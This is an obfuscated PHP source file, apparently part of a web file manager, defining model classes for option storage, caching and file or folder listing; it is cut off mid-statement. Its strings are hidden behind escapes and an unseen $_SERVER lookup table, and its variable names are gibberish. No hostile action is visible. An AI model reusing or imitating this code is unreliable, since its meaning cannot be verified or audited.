<?php
 goto EÕ•§ê¥Õ; b“Æåéó: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\x74\x65\x6d\117\x70\x74\151\x6f\x6e"; public $field = array(); public function listData($şâÑ•„á = false, $¤Ôˆ¨ = "\x6d\x6f\144\151\x66\171\124\151\155\145", $º†Èêàí = false) { $’¶æÁáÂ = Model($this->modelType)->get(!1, $this->optionType, !0); $ËÆôà°Á = array_values($’¶æÁáÂ); if ($ËÆôà°Á && $ËÆôà°Á[0] && !is_array($ËÆôà°Á[0])) { Model($this->modelType)->cacheRemove($this->optionType); $’¶æÁáÂ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$’¶æÁáÂ) { return $şâÑ•„á ? null : array(); } if (!$şâÑ•„á) { $’¶æÁáÂ = array_filter(array_values($’¶æÁáÂ)); return array_sort_by($’¶æÁáÂ, $¤Ôˆ¨, $º†Èêàí); } return $’¶æÁáÂ[$_SERVER[”ú…±Ú¥][434] . $şâÑ•„á]; } public function insert($„—úÈˆÉ) { $¶Á×´öà =& $_SERVER[”ú…±Ú¥]; $„—úÈˆÉ = array_field_key($„—úÈˆÉ, $this->field); $ëöËØş‚ = Model($this->modelType)->get($¶Á×´öà[435], $this->optionType . $¶Á×´öà[436]); $ëöËØş‚ = $ëöËØş‚ ? $ëöËØş‚ : 0; $„—úÈˆÉ[$¶Á×´öà[437]] = ++$ëöËØş‚; $„—úÈˆÉ[$¶Á×´öà[211]] = time(); $„—úÈˆÉ[$¶Á×´öà[85]] = time(); Model($this->modelType)->set($¶Á×´öà[435], $ëöËØş‚, $this->optionType . $¶Á×´öà[436]); Model($this->modelType)->set($¶Á×´öà[434] . $ëöËØş‚, $„—úÈˆÉ, $this->optionType); return $ëöËØş‚; } public function update($„¯•™íå, $¿“‹ƒæø) { $ÅÈ èë =& $_SERVER[”ú…±Ú¥]; $¿“‹ƒæø = array_field_key($¿“‹ƒæø, $this->field); $­ÜÓÔÁâ = $this->listData($„¯•™íå); if (!$­ÜÓÔÁâ || !$„¯•™íå) { return !1; } $¿“‹ƒæø = array_merge($­ÜÓÔÁâ, $¿“‹ƒæø); $¿“‹ƒæø[$ÅÈ èë[85]] = time(); return Model($this->modelType)->set($ÅÈ èë[434] . $„¯•™íå, $¿“‹ƒæø, $this->optionType); } public function remove($½¹Õ›­Â) { if (!$½¹Õ›­Â) { return !1; } return Model($this->modelType)->remove($_SERVER[”ú…±Ú¥][434] . $½¹Õ›­Â, $this->optionType); } public function clear() { $ˆ½–àîü =& $_SERVER[”ú…±Ú¥]; Model($this->modelType)->remove($ˆ½–àîü[435], $this->optionType . $ˆ½–àîü[436]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Ş²ÁÀõÜ, $à¨Ó±©å) { if (!$à¨Ó±©å) { return !1; } $®àÉëÇ– = $this->listData(); $®àÉëÇ– = array_to_keyvalue($®àÉëÇ–, $Ş²ÁÀõÜ); return isset($®àÉëÇ–[$à¨Ó±©å]) ? $®àÉëÇ–[$à¨Ó±©å] : !1; } public function findByName($ŒÙ Ú²Ë) { return $this->findByKey($_SERVER[”ú…±Ú¥][32], $ŒÙ Ú²Ë); } protected function resetData($ƒÉ§‘ä°) { $Æöóç ˜ =& $_SERVER[”ú…±Ú¥]; $ƒÉ§‘ä° = is_array($ƒÉ§‘ä°) ? $ƒÉ§‘ä° : array(); $áı„’¹Ù = array(); for ($Ğ½¿‚† = 0; $Ğ½¿‚† < count($ƒÉ§‘ä°); $Ğ½¿‚†++) { $áı„’¹Ù[$Æöóç ˜[434] . $ƒÉ§‘ä°[$Ğ½¿‚†][$Æöóç ˜[437]]] = $ƒÉ§‘ä°[$Ğ½¿‚†]; } return Model($this->modelType)->set($áı„’¹Ù, !1, $this->optionType); } private function getAutoName($¸‚¤§¼Â) { $ñØˆöğ = array_to_keyvalue($this->listData(), $_SERVER[”ú…±Ú¥][32]); if (!$ñØˆöğ || !isset($ñØˆöğ[$¸‚¤§¼Â])) { return $¸‚¤§¼Â; } for ($ªâ¾ÒÆ = 1; $ªâ¾ÒÆ < count($ñØˆöğ); $ªâ¾ÒÆ++) { $¨˜˜ôù’ = $¸‚¤§¼Â . "\x28{$ªâ¾ÒÆ}\x29"; if (!isset($ñØˆöğ[$¨˜˜ôù’])) { return $¨˜˜ôù’; } } return $¨˜˜ôù’; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($‹Ê¸¸¡Á = false, $Ì‰û¼Ï± = '', $½á²˜Ö = false) { $·€´ÖÒ =& $_SERVER[”ú…±Ú¥]; $õ’‘´›Û = $this->cacheGet($Ì‰û¼Ï±); $ñ¬ßı = $this->optionDefault($Ì‰û¼Ï±); $ñ¬ßı = is_array($ñ¬ßı) ? $ñ¬ßı : array(); if (is_array($õ’‘´›Û)) { $õ’‘´›Û = array_merge($ñ¬ßı, $õ’‘´›Û); return $‹Ê¸¸¡Á ? isset($õ’‘´›Û[$‹Ê¸¸¡Á]) ? $õ’‘´›Û[$‹Ê¸¸¡Á] : null : $õ’‘´›Û; } $«èşƒü© = $this->filterWhere(array($·€´ÖÒ[33] => $Ì‰û¼Ï±)); $õ’‘´›Û = $this->where($«èşƒü©)->select(); $õ’‘´›Û = array_to_keyvalue($õ’‘´›Û, $·€´ÖÒ[94], $·€´ÖÒ[412]); foreach ($õ’‘´›Û as $±Á‡ş®£ => $ãÃÓ¹‹İ) { if ($½á²˜Ö || in_array($±Á‡ş®£, $this->jsonField)) { $õ’‘´›Û[$±Á‡ş®£] = json_decode($ãÃÓ¹‹İ, !0); } } $this->cacheSet($Ì‰û¼Ï±, $õ’‘´›Û); $õ’‘´›Û = array_merge($ñ¬ßı, $õ’‘´›Û); return $‹Ê¸¸¡Á ? $õ’‘´›Û[$‹Ê¸¸¡Á] : $õ’‘´›Û; } public function set($àçê—Û¶, $–ÉÄ««Ï = false, $ËÉ¿ÃÀÌ = '') { $¦§ùüÛ =& $_SERVER[”ú…±Ú¥]; $this->cacheRemove($ËÉ¿ÃÀÌ); $şÈ§¾ãÇ = array(); $˜Ù³Ø = is_array($àçê—Û¶) ? $àçê—Û¶ : array($àçê—Û¶ => $–ÉÄ««Ï); foreach ($˜Ù³Ø as $ïš£€É¶ => $µå”Ãó„) { if (is_array($µå”Ãó„)) { $µå”Ãó„ = json_encode_force($µå”Ãó„); } $this->checkLength($µå”Ãó„, !1, $this->tableName . $¦§ùüÛ[4] . $àçê—Û¶); $µå”Ãó„ = self::textEncode($µå”Ãó„); $˜Ù³Ø = array($¦§ùüÛ[33] => $ËÉ¿ÃÀÌ, $¦§ùüÛ[94] => $ïš£€É¶, $¦§ùüÛ[412] => $µå”Ãó„); $şÈ§¾ãÇ[] = $this->filterWhere($˜Ù³Ø); } if (!$şÈ§¾ãÇ) { return !0; } $áã®ôò = $this->cacheKey($¦§ùüÛ[438]); CacheLock::lock($áã®ôò); $È´Å¿˜î = $this->addAll($şÈ§¾ãÇ, array(), !0); CacheLock::unlock($áã®ôò); return $È´Å¿˜î; } protected function optionDefault($ü¼Œ±ĞÚ = '') { return !1; } public function setDeep($­±ÅÏÊê, $»¢îÇÔ = false, $´á¦öÃø = '') { $Â¦§çµğ = explode($_SERVER[”ú…±Ú¥][10], $­±ÅÏÊê); $§¶èÏ€· = $this->get(); array_set_value($§¶èÏ€·, $­±ÅÏÊê, $»¢îÇÔ); $this->set($Â¦§çµğ[0], $§¶èÏ€·[$Â¦§çµğ[0]], $´á¦öÃø); } public function remove($ô¨•‹–, $ÅÑÊ¬™é = '') { $«ôÄÛşŒ =& $_SERVER[”ú…±Ú¥]; $this->cacheRemove($ÅÑÊ¬™é); $²ÀÃµö = $this->filterWhere(array($«ôÄÛşŒ[94] => $ô¨•‹–, $«ôÄÛşŒ[33] => $ÅÑÊ¬™é)); if (is_null($ô¨•‹–)) { unset($²ÀÃµö[$«ôÄÛşŒ[94]]); } return $this->where($²ÀÃµö)->delete(); } public function cacheSet($¿œûæûû, $ãš¢ÀÚ¿ = false) { return Cache::set($this->cacheKey($¿œûæûû), $ãš¢ÀÚ¿); } public function cacheGet($ÚÌé¶Ÿß) { return Cache::get($this->cacheKey($ÚÌé¶Ÿß)); } public function cacheRemove($¹¹öîè) { return Cache::remove($this->cacheKey($¹¹öîè)); } protected function filterWhere($ÄßÙ÷Ÿ¢) { return $ÄßÙ÷Ÿ¢; } protected function cacheKey($²È«Ò÷¹) { return $²È«Ò÷¹; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\x75\x72\143\x65"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\x61\x6d\145" => "\151\157\137\163\157\165\x72\143\x65\x5f\x6d\x65\x74\141", "\155\x65\164\141\106\x69\x65\x6c\144" => "\x73\x6f\x75\x72\143\145\111\x44"); protected $dataAuto = array(array("\x6d\157\x64\151\x66\171\124\x69\x6d\145", "\164\x69\x6d\145", "\x69\156\163\145\x72\164", "\146\165\156\143\x74\x69\x6f\x6e"), array("\143\x72\145\x61\x74\x65\124\x69\155\x65", "\x74\151\x6d\145", "\x69\156\163\x65\x72\164", "\x66\165\x6e\x63\164\151\x6f\x6e"), array("\166\x69\145\x77\x54\x69\155\145", "\x74\151\155\145", "\x69\156\x73\145\x72\164", "\x66\x75\x6e\143\164\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ıä†ËÕ—) { return $this->listSource(array($_SERVER[”ú…±Ú¥][439] => $ıä†ËÕ—)); } public function typeName($„‚¡õ) { static $”„õ¨¨ = array(self::TYPE_SYSTEM => "\163\171\163\164\145\155", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\x67\162\157\x75\x70"); return $”„õ¨¨[$„‚¡õ . $_SERVER[”ú…±Ú¥][12]]; } public function sourceListInfo($½Ô¨ê¬, $—•¤—É = false) { $” ŸáÎ£ =& $_SERVER[”ú…±Ú¥]; $½Ô¨ê¬ = $½Ô¨ê¬ ? $½Ô¨ê¬ : array(); $½Ô¨ê¬ = array_filter(array_unique($½Ô¨ê¬)); if (!$½Ô¨ê¬) { return array(); } $ˆÏÕ¬• = $this->where(array($” ŸáÎ£[440] => array($” ŸáÎ£[7], $½Ô¨ê¬)))->select(); $this->_listDataApply($ˆÏÕ¬•, $—•¤—É); return array_to_keyvalue($ˆÏÕ¬•, $” ŸáÎ£[440]); } public function pathInfoFilter(&$œç˜¾óæ) { $®òİĞğ¶ =& $_SERVER[”ú…±Ú¥]; static $“©ÖÀÉ§ = false; static $ûÈ²èÄö = false; static $˜ÊĞÎ©½ = false; if (!$“©ÖÀÉ§) { $Ê¦‰Šï = $®òİĞğ¶[441]; $Ê¦‰Šï .= $®òİĞğ¶[442]; $Ê¦‰Šï .= $®òİĞğ¶[443]; $¾È úØ§ = $®òİĞğ¶[444]; $é‹Á»Ó¨ = explode($®òİĞğ¶[50], $¾È úØ§); $“©ÖÀÉ§ = explode($®òİĞğ¶[50], $Ê¦‰Šï); $ûÈ²èÄö = array(); foreach ($“©ÖÀÉ§ as $Õ…·Ø‰) { if (in_array($Õ…·Ø‰, $é‹Á»Ó¨)) { continue; } $ûÈ²èÄö[] = $Õ…·Ø‰; } $˜ÊĞÎ©½ = explode($®òİĞğ¶[50], $®òİĞğ¶[445]); } foreach ($˜ÊĞÎ©½ as $Ìï§ƒ½è) { if (isset($œç˜¾óæ[$Ìï§ƒ½è])) { $œç˜¾óæ[$Ìï§ƒ½è] = intval($œç˜¾óæ[$Ìï§ƒ½è]); } } $œç˜¾óæ[$®òİĞğ¶[84]] = $®òİĞğ¶[446] . $œç˜¾óæ[$®òİĞğ¶[440]] . $®òİĞğ¶[447]; $œç˜¾óæ[$®òİĞğ¶[33]] = $œç˜¾óæ[$®òİĞğ¶[448]] == 1 ? $®òİĞğ¶[75] : $®òİĞğ¶[210]; $œç˜¾óæ[$®òİĞğ¶[449]] = $this->typeName($œç˜¾óæ[$®òİĞğ¶[449]]); if ($œç˜¾óæ[$®òİĞğ¶[448]] != 1) { $œç˜¾óæ[$®òİĞğ¶[174]] = $œç˜¾óæ[$®òİĞğ¶[450]]; unset($œç˜¾óæ[$®òİĞğ¶[450]]); } $İşû¹“õ = $“©ÖÀÉ§; if (isset($œç˜¾óæ[$®òİĞğ¶[451]]) && $œç˜¾óæ[$®òİĞğ¶[451]][$®òİĞğ¶[452]] == -1) { $İşû¹“õ = $ûÈ²èÄö; } $œç˜¾óæ = array_field_key($œç˜¾óæ, $İşû¹“õ); return $œç˜¾óæ; } public function listUserFav() { $¿ô¯Ì‡á =& $_SERVER[”ú…±Ú¥]; $Ãœ’×š = Model($¿ô¯Ì‡á[453])->listData(); $ß¿öı»ä = array_filter_by_field($Ãœ’×š, $¿ô¯Ì‡á[33], $¿ô¯Ì‡á[454]); $ß¿öı»ä = array_to_keyvalue($ß¿öı»ä, $¿ô¯Ì‡á[12], $¿ô¯Ì‡á[84]); if ($ß¿öı»ä) { $ş¿òµÆè = $this->listSource(array($¿ô¯Ì‡á[455] => array($¿ô¯Ì‡á[456], $ß¿öı»ä))); } $ş¿òµÆè = array_to_keyvalue($ş¿òµÆè[$¿ô¯Ì‡á[407]], $¿ô¯Ì‡á[440]); foreach ($Ãœ’×š as &$Ê“ĞÃÖ) { $Ê“ĞÃÖ = array($¿ô¯Ì‡á[457] => $Ê“ĞÃÖ[$¿ô¯Ì‡á[437]], $¿ô¯Ì‡á[458] => $Ê“ĞÃÖ[$¿ô¯Ì‡á[32]], $¿ô¯Ì‡á[459] => $Ê“ĞÃÖ[$¿ô¯Ì‡á[84]], $¿ô¯Ì‡á[460] => $Ê“ĞÃÖ[$¿ô¯Ì‡á[33]], $¿ô¯Ì‡á[461] => $Ê“ĞÃÖ[$¿ô¯Ì‡á[211]], $¿ô¯Ì‡á[462] => $Ê“ĞÃÖ[$¿ô¯Ì‡á[85]]); if ($Ê“ĞÃÖ[$¿ô¯Ì‡á[33]] == $¿ô¯Ì‡á[454] && $ş¿òµÆè[$Ê“ĞÃÖ[$¿ô¯Ì‡á[84]]]) { $Ê“ĞÃÖ[$¿ô¯Ì‡á[87]] = $ş¿òµÆè[$Ê“ĞÃÖ[$¿ô¯Ì‡á[84]]]; } } unset($Ê“ĞÃÖ); return $Ãœ’×š; } public function listUserTag($É¨ÊëÉ) { $ñü­§ =& $_SERVER[”ú…±Ú¥]; if ($É¨ÊëÉ && !is_array($É¨ÊëÉ)) { $É¨ÊëÉ = array($É¨ÊëÉ); } $Ÿ®Í·ˆ£ = Model($ñü­§[463])->listData(); $øßËğñ = array(); $±«˜ŠÛí = array(); foreach ($Ÿ®Í·ˆ£ as $“¬×“õƒ) { $®ş¦éó± = $“¬×“õƒ[$ñü­§[84]]; if (!$®ş¦éó±) { continue; } if (!isset($±«˜ŠÛí[$®ş¦éó±])) { $±«˜ŠÛí[$®ş¦éó±] = array(); } $±«˜ŠÛí[$®ş¦éó±][] = $“¬×“õƒ[$ñü­§[464]]; $øßËğñ[$“¬×“õƒ[$ñü­§[84]]] = $“¬×“õƒ; } $”–òµß¹ = array(); $ãÀç•¢š = array(); $õ¨ÈªÕµ = array(); foreach ($±«˜ŠÛí as $´øœÔí => $§ËÓæèù) { $ØÀ†èõ™ = !0; if (!$É¨ÊëÉ) { $”–òµß¹[] = $´øœÔí; continue; } foreach ($É¨ÊëÉ as $í¡ß¦ğ¼) { if (!in_array($í¡ß¦ğ¼, $§ËÓæèù)) { $ØÀ†èõ™ = !1; break; } } if (!$ØÀ†èõ™) { continue; } if (!is_numeric($´øœÔí)) { $ŠÄ¿ü¶ñ = $øßËğñ[$´øœÔí]; $¼„‰ı¬º = array($ñü­§[32] => $ŠÄ¿ü¶ñ[$ñü­§[32]], $ñü­§[84] => $ŠÄ¿ü¶ñ[$ñü­§[84]], $ñü­§[33] => $ŠÄ¿ü¶ñ[$ñü­§[33]], $ñü­§[87] => array($ñü­§[465] => 1), $ñü­§[212] => !0); if ($ŠÄ¿ü¶ñ[$ñü­§[33]] == $ñü­§[210]) { $õ¨ÈªÕµ[] = $¼„‰ı¬º; } if ($ŠÄ¿ü¶ñ[$ñü­§[33]] == $ñü­§[75]) { $ãÀç•¢š[] = $¼„‰ı¬º; } continue; } $”–òµß¹[] = $´øœÔí; } if ($”–òµß¹) { $Ü¸´ã¿‡ = $this->listSource(array($ñü­§[455] => array($ñü­§[456], $”–òµß¹))); } $Ü¸´ã¿‡ = $Ü¸´ã¿‡ ? $Ü¸´ã¿‡ : array($ñü­§[82] => array(), $ñü­§[83] => array()); $Ü¸´ã¿‡[$ñü­§[82]] = array_merge($Ü¸´ã¿‡[$ñü­§[82]], $ãÀç•¢š); $Ü¸´ã¿‡[$ñü­§[83]] = array_merge($Ü¸´ã¿‡[$ñü­§[83]], $õ¨ÈªÕµ); if (isset($Ü¸´ã¿‡[$ñü­§[404]]) && count($”–òµß¹) == $Ü¸´ã¿‡[$ñü­§[404]][$ñü­§[405]]) { return $Ü¸´ã¿‡; } $”´æÑä = array(); $è¹Ç×† = array_to_keyvalue($Ü¸´ã¿‡[$ñü­§[82]], $ñü­§[12], $ñü­§[440]); $›á¾í÷ = array_to_keyvalue($Ü¸´ã¿‡[$ñü­§[83]], $ñü­§[12], $ñü­§[440]); $£Üì­‘ê = array_merge($›á¾í÷, $è¹Ç×†); foreach ($”–òµß¹ as $®ş¦éó±) { if (!in_array($®ş¦éó±, $£Üì­‘ê)) { $”´æÑä[] = $®ş¦éó±; } } if ($”´æÑä) { Model($ñü­§[466])->removeBySource($”´æÑä); } return $Ü¸´ã¿‡; } public function listUserRecycle() { $’‹àçÚí =& $_SERVER[”ú…±Ú¥]; $ÄÂôéË = Model($’‹àçÚí[467])->listData(); if (!$ÄÂôéË) { return array(); } $üëàóóù = array($’‹àçÚí[455] => array($’‹àçÚí[456], $ÄÂôéË), $’‹àçÚí[468] => 1); return $this->listSource($üëàóóù); } public function listSource($Í×è¸Ë÷, $øêš²© = 3000, $™»ÖÅü‚ = false) { $í‡§òËŞ =& $_SERVER[”ú…±Ú¥]; if (!isset($Í×è¸Ë÷[$í‡§òËŞ[469]])) { $Í×è¸Ë÷[$í‡§òËŞ[469]] = 0; } if (isset($Í×è¸Ë÷[$í‡§òËŞ[470]]) && $Í×è¸Ë÷[$í‡§òËŞ[470]] == $í‡§òËŞ[208]) { $Í×è¸Ë÷[$í‡§òËŞ[450]] = array($í‡§òËŞ[369], $í‡§òËŞ[471]); } $ûÅÒ¤˜ô = $í‡§òËŞ[472]; $¤¬æ¨¬² = $this->field($ûÅÒ¤˜ô)->_makeOrder()->where($Í×è¸Ë÷)->selectPage($øêš²©); $this->_listPageCheck($¤¬æ¨¬², $ûÅÒ¤˜ô, $Í×è¸Ë÷); $this->_listDataApply($¤¬æ¨¬²[$í‡§òËŞ[407]], $™»ÖÅü‚); $this->_listMake($¤¬æ¨¬²); return $¤¬æ¨¬²; } private function _listPageCheck(&$¾Ú—×Á¯, $€ÌóùÀ, $ôÅ£¬Õ½) { $§Ê˜Ù†¡ =& $_SERVER[”ú…±Ú¥]; if (!is_array($¾Ú—×Á¯[$§Ê˜Ù†¡[404]])) { return; } $¹ÒÎıÔÄ = $¾Ú—×Á¯[$§Ê˜Ù†¡[404]]; if ($¹ÒÎıÔÄ[$§Ê˜Ù†¡[406]] <= 1) { return; } if ($¹ÒÎıÔÄ[$§Ê˜Ù†¡[405]] >= 100000) { return; } if (Model($§Ê˜Ù†¡[473])->get($§Ê˜Ù†¡[474]) != $§Ê˜Ù†¡[475]) { return; } $€ÌóùÀ = str_replace(array($§Ê˜Ù†¡[53], $§Ê˜Ù†¡[380], $§Ê˜Ù†¡[191]), $§Ê˜Ù†¡[12], $€ÌóùÀ); $€ÌóùÀ = $§Ê˜Ù†¡[476] . str_replace($§Ê˜Ù†¡[50], $§Ê˜Ù†¡[477], $€ÌóùÀ) . $§Ê˜Ù†¡[478]; $É¦º™ú¨ = $§Ê˜Ù†¡[479]; $É¦º™ú¨ = $É¦º™ú¨ . $§Ê˜Ù†¡[480]; $§ÁİÑÏœ = $¹ÒÎıÔÄ[$§Ê˜Ù†¡[401]] * ($¹ÒÎıÔÄ[$§Ê˜Ù†¡[391]] - 1) . $§Ê˜Ù†¡[50] . $¹ÒÎıÔÄ[$§Ê˜Ù†¡[401]]; $ÑÆ§£· = $this->_makeOrder(!0); $‚ÉÓ »± = $§Ê˜Ù†¡[476] . str_replace($§Ê˜Ù†¡[50], $§Ê˜Ù†¡[477], $ÑÆ§£·[0]); if (strpos($‚ÉÓ »±, $§Ê˜Ù†¡[481])) { $‚ÉÓ »± = str_replace($§Ê˜Ù†¡[481], $§Ê˜Ù†¡[482], $‚ÉÓ »±); } else { $‚ÉÓ »± .= $§Ê˜Ù†¡[483] . $ÑÆ§£·[1]; } $´Ù©¹ù = array(); foreach ($ôÅ£¬Õ½ as $¬ÎÅÀµ¡ => $¢ “ûöğ) { $´Ù©¹ù[$§Ê˜Ù†¡[476] . $¬ÎÅÀµ¡] = $¢ “ûöğ; } $this->alias($§Ê˜Ù†¡[484])->field($€ÌóùÀ)->limit($§ÁİÑÏœ)->order($‚ÉÓ »±); $³¤íàî = $this->join($É¦º™ú¨)->where($´Ù©¹ù)->select(); if ($³¤íàî) { $¾Ú—×Á¯[$§Ê˜Ù†¡[407]] = $³¤íàî; } } protected function _makeOrder($¥ıï¼†° = false) { $ĞÊƒœ•÷ =& $_SERVER[”ú…±Ú¥]; $³ííêÃë = Model($ĞÊƒœ•÷[485])->get($ĞÊƒœ•÷[486]); $áı¢ù†¢ = Model($ĞÊƒœ•÷[485])->get($ĞÊƒœ•÷[487]); $¢­ºÁøï = array($ĞÊƒœ•÷[488] => $ĞÊƒœ•÷[489], $ĞÊƒœ•÷[490] => $ĞÊƒœ•÷[491]); $±œğ¸ÃÍ = array($ĞÊƒœ•÷[32] => $ĞÊƒœ•÷[32], $ĞÊƒœ•÷[76] => $ĞÊƒœ•÷[76], $ĞÊƒœ•÷[174] => $ĞÊƒœ•÷[450], $ĞÊƒœ•÷[492] => $ĞÊƒœ•÷[492], $ĞÊƒœ•÷[493] => $ĞÊƒœ•÷[494], $ĞÊƒœ•÷[211] => $ĞÊƒœ•÷[211], $ĞÊƒœ•÷[85] => $ĞÊƒœ•÷[85]); $Ûñ³İİÛ = Input::get($ĞÊƒœ•÷[495], $ĞÊƒœ•÷[7], $³ííêÃë, array_keys($±œğ¸ÃÍ)); $üò£Ä¨… = Input::get($ĞÊƒœ•÷[496], $ĞÊƒœ•÷[7], $áı¢ù†¢, array_keys($¢­ºÁøï)); if (!in_array($Ûñ³İİÛ, array_keys($±œğ¸ÃÍ))) { $Ûñ³İİÛ = $ĞÊƒœ•÷[32]; } if (!in_array($üò£Ä¨…, array_keys($¢­ºÁøï))) { $Ûñ³İİÛ = $ĞÊƒœ•÷[488]; } if ($Ûñ³İİÛ == $ĞÊƒœ•÷[32]) { } $ú“‘è“ı = $ĞÊƒœ•÷[497] . $±œğ¸ÃÍ[$Ûñ³İİÛ] . $ĞÊƒœ•÷[53] . $¢­ºÁøï[$üò£Ä¨…]; $ú“‘è“ı = rtrim(trim($ú“‘è“ı), $ĞÊƒœ•÷[50]); if ($¥ıï¼†°) { return array($ú“‘è“ı, $¢­ºÁøï[$üò£Ä¨…]); } return $this->order($ú“‘è“ı); } protected function _listDataApplyItem($ÙĞÅš³, $¨ıÑõøÚ = false) { $ÑÙè¶Ä = array($ÙĞÅš³); $this->_listDataApply($ÑÙè¶Ä, $¨ıÑõøÚ); return $ÑÙè¶Ä[0]; } protected function _listDataApply(&$«ùâ‡æ’, $îúËæñö = false) { $®õ¬—Úğ =& $_SERVER[”ú…±Ú¥]; if (!$«ùâ‡æ’) { $«ùâ‡æ’ = array(); return; } $¥ÄµìÉ = array_to_keyvalue($«ùâ‡æ’, $®õ¬—Úğ[12], $®õ¬—Úğ[440]); $¥ÄµìÉ = array_unique($¥ÄµìÉ); $this->_listSourceCache($«ùâ‡æ’); if (!$îúËæñö) { $this->_listAppendMeta($«ùâ‡æ’, $¥ÄµìÉ); $this->_listAppendFileMeta($«ùâ‡æ’, $¥ÄµìÉ); $this->_listAppendChildren($«ùâ‡æ’, $¥ÄµìÉ); } $this->_listAppendPath($«ùâ‡æ’); $this->_listAppendAuth($«ùâ‡æ’); $this->_listAppendSourceInfo($«ùâ‡æ’, $¥ÄµìÉ); $this->_listAppendUser($«ùâ‡æ’); $this->_listFilterInfo($«ùâ‡æ’, $îúËæñö); $this->_listAppendAuthSecret($«ùâ‡æ’); } protected function _listSourceCache($Êë»èô) { $Œ¬¦¨£¿ =& $_SERVER[”ú…±Ú¥]; foreach ($Êë»èô as $îÈËŸ¸¡) { self::$cacheSourceInfo[$Œ¬¦¨£¿[498] . $îÈËŸ¸¡[$Œ¬¦¨£¿[440]]] = $îÈËŸ¸¡; } } protected function _listFilterInfo(&$¸ÀãŸîš, $æ ÷ö†˜ = false) { $·ûé­€« =& $_SERVER[”ú…±Ú¥]; foreach ($¸ÀãŸîš as &$«”œ‘Ë¥) { $«”œ‘Ë¥ = $this->pathInfoFilter($«”œ‘Ë¥); self::$cachePathInfo[$·ûé­€«[499] . intval($æ ÷ö†˜) . $·ûé­€«[424] . $«”œ‘Ë¥[$·ûé­€«[440]]] = $«”œ‘Ë¥; } unset($«”œ‘Ë¥); } protected function _listMake(&$ÚãÇ½¿¿) { $ ÔÂ¯ =& $_SERVER[”ú…±Ú¥]; $ÚãÇ½¿¿[$ ÔÂ¯[82]] = array(); $ÚãÇ½¿¿[$ ÔÂ¯[83]] = array(); foreach ($ÚãÇ½¿¿[$ ÔÂ¯[407]] as $Û¥Ñıƒ) { $ ™ÂÇ†Ú = $Û¥Ñıƒ[$ ÔÂ¯[448]] == 1 ? $ ÔÂ¯[82] : $ ÔÂ¯[83]; $ÚãÇ½¿¿[$ ™ÂÇ†Ú][] = $Û¥Ñıƒ; } unset($ÚãÇ½¿¿[$ ÔÂ¯[407]]); } protected function _listAppendMeta(&$ ‡îê Ñ, $ ‘”³Ç­) { $Éº¦´ç¸ =& $_SERVER[”ú…±Ú¥]; $˜¨¹ÒÁ¯ = array($Éº¦´ç¸[455] => array($Éº¦´ç¸[456], $ ‘”³Ç­)); $·²õıè = Model($Éº¦´ç¸[500])->field($Éº¦´ç¸[501])->where($˜¨¹ÒÁ¯)->select(); if (!$·²õıè) { return; } $®—ö™’ˆ = array($Éº¦´ç¸[502], $Éº¦´ç¸[503], $Éº¦´ç¸[482]); $Å¢ì­²¨ = array(); foreach ($·²õıè as $†ĞÀÄÁ³) { if (!isset($Å¢ì­²¨[$†ĞÀÄÁ³[$Éº¦´ç¸[440]]])) { $Å¢ì­²¨[$†ĞÀÄÁ³[$Éº¦´ç¸[440]]] = array(); } if (in_array($†ĞÀÄÁ³[$Éº¦´ç¸[94]], $®—ö™’ˆ)) { continue; } $Å¢ì­²¨[$†ĞÀÄÁ³[$Éº¦´ç¸[440]]][$†ĞÀÄÁ³[$Éº¦´ç¸[94]]] = $†ĞÀÄÁ³[$Éº¦´ç¸[412]]; } foreach ($ ‡îê Ñ as &$ÖÌƒ ÑÔ) { $ÖÌƒ ÑÔ[$Éº¦´ç¸[504]] = !1; if (isset($Å¢ì­²¨[$ÖÌƒ ÑÔ[$Éº¦´ç¸[440]]])) { $ÖÌƒ ÑÔ[$Éº¦´ç¸[504]] = $Å¢ì­²¨[$ÖÌƒ ÑÔ[$Éº¦´ç¸[440]]]; } if ($this->fileIsLock($ÖÌƒ ÑÔ) && $ÖÌƒ ÑÔ[$Éº¦´ç¸[451]]) { $Û¼’ŸÎ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ÖÌƒ ÑÔ[$Éº¦´ç¸[451]][$Éº¦´ç¸[452]] = AuthModel::authDisable($ÖÌƒ ÑÔ[$Éº¦´ç¸[451]][$Éº¦´ç¸[452]], $Û¼’ŸÎ); $ÖÌƒ ÑÔ[$Éº¦´ç¸[451]][$Éº¦´ç¸[505]][$Éº¦´ç¸[451]] = $ÖÌƒ ÑÔ[$Éº¦´ç¸[451]][$Éº¦´ç¸[452]]; } } unset($ÖÌƒ ÑÔ); } protected function _listAppendFileMeta(&$¶–©Ïò², $Î•©ıÜÄ) { $±›†¸»Ä =& $_SERVER[”ú…±Ú¥]; $ıŞ®¸³Ë = array_to_keyvalue($¶–©Ïò², $±›†¸»Ä[12], $±›†¸»Ä[506]); $ıŞ®¸³Ë = array_filter(array_unique($ıŞ®¸³Ë)); if (!$ıŞ®¸³Ë) { return; } $©‘»—êĞ = array($±›†¸»Ä[507] => array($±›†¸»Ä[456], $ıŞ®¸³Ë)); $®êşê¨µ = $±›†¸»Ä[508]; $¢Ä·õ¥ = Model($±›†¸»Ä[509])->field($®êşê¨µ)->where($©‘»—êĞ)->select(); $¢Ä·õ¥ = array_to_keyvalue($¢Ä·õ¥, $±›†¸»Ä[506]); $¦¼‚Å»  = Model($±›†¸»Ä[510])->field($±›†¸»Ä[511])->where($©‘»—êĞ)->select(); $¦¼‚Å»  = $¦¼‚Å»  ? $¦¼‚Å»  : array(); $­îîƒ¹ = array(); foreach ($¦¼‚Å»  as $óı…‘İ–) { if (!isset($­îîƒ¹[$óı…‘İ–[$±›†¸»Ä[506]]])) { $­îîƒ¹[$óı…‘İ–[$±›†¸»Ä[506]]] = array(); } $­îîƒ¹[$óı…‘İ–[$±›†¸»Ä[506]]][$óı…‘İ–[$±›†¸»Ä[94]]] = 